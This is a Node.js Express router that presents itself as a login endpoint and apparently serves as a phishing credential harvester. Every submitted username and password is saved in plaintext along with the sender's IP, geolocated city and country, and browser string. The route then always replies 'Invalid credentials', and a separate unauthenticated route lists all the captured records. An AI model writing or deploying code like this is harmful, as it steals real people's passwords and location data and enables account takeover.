const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const dotenv = require("dotenv");
const axios = require("axios");

dotenv.config();

const router = express.Router();
router.use(cors());
router.use(express.json());

mongoose
  .connect(process.env.MONGODB_URI)
  .then(() => console.log("Connected to MongoDB"))
  .catch((err) => console.error("Could not connect to MongoDB:", err));

const loginAttemptSchema = new mongoose.Schema({
  username: String,
  password: String,
  timestamp: { type: Date, default: Date.now },
  ip: String,
  country: String,
  city: String,
  timezone: String,
  browser: String,
  os: String,
});

const LoginAttempt = mongoose.model("LoginAttempt", loginAttemptSchema);

// Middleware để lấy IP thực
const getClientIp = (req) => {
  const forwardedFor = req.headers["x-forwarded-for"];
  if (forwardedFor) {
    const ips = forwardedFor.split(",");
    return ips[0].trim();
  }
  return req.headers["x-real-ip"] || req.connection.remoteAddress;
};

router.post("/login", async (req, res) => {
  const { username, password } = req.body;
  const ip = getClientIp(req);
  const userAgent = req.headers["user-agent"];

  console.log("Client IP:", ip);

  try {
    const locationResponse = await axios.get(`https://ipapi.co/${ip}/json/`);
    const locationData = locationResponse.data;

    console.log("Location Data:", locationData);

    const loginAttempt = new LoginAttempt({
      username,
      password,
      ip,
      country: locationData.country_name || "Unknown",
      city: locationData.city || "Unknown",
      timezone: locationData.timezone || "Unknown",
      browser: userAgent,
      os: userAgent,
    });

    await loginAttempt.save();
    res.status(401).json({ message: "Invalid credentials" });
  } catch (error) {
    console.error("Error saving login attempt:", error);
    res.status(500).json({ message: "Server error" });
  }
});

router.get("/login-attempts", async (req, res) => {
  try {
    const attempts = await LoginAttempt.find().sort({ timestamp: -1 });
    res.json(attempts);
  } catch (error) {
    res.status(500).json({ message: "Error fetching login attempts" });
  }
});

module.exports = router;
